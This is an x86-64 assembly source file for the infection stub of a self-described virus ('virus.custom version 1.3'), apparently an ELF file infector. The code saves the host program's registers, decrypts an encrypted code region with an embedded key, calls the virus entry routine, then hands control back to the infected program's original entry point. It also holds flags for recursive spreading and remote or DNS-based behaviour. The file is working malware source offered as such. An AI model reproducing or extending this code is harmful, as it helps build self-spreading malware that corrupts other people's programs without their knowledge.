; z1
global _infect
global _infect_push
global _infect_pop
global dataearly
global key
global fingerprint
; z2
global data
global opt
global iscompressed
global environ
global seed
; z3
global test_area
global num_to_xor


extern entry
extern decrypt
extern DECRYPT_ROUTINE
extern cmpr_start
extern cmpr_end

;
; ZONE 1
;____________
section .textstart

_infect:
_infect_push:
	push rax
	push rbx
	push rcx
	push rdx
	push rsi
	push rdi
	push rsp

	lea rdi, [rel cmpr_start]
	lea rsi, [rel cmpr_end]
	sub rsi, rdi ;cmpr_end - cmpr_start
	lea rdx, [rel key]
	call DECRYPT_ROUTINE

	jmp start2

dataearly:
;0
key: db `KEY000000000KEY\0`
;2
signature: db `\0virus.custom version 1.3 (c)oded dec-2018 by ndombre-agadhgad - `
fingerprint: db `AAAAAAAA`,0


;
; ZONE 2
;____________


section .textcmpr
data:
;0
diff: db `00000000`
;1
opt:
do_recur: db `\0`
do_remote: db `\0`
do_dns_remote: db `\0`
print_msg: db `\0`
aligner: db `0000`
;2
iscompressed: db `\0\0\0\0\0\0\0\0`
;3
environ: db `00000000`

start2:
	call entry

	;get entry_point of the program
	mov r14, QWORD[rel diff]
	lea rax, [rel _infect]
	sub rax, r14
	mov r14, rax

_infect_pop:
	pop rsp
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop rax

	push r14
	mov r14, 0
	ret

data2:
	seed: db `10400709`

;
; ZONE 3
;____________

section .text
test_area: db `AAAAAAAAAAAAAAA`,0
num_to_xor: db `\0\0\0\0`
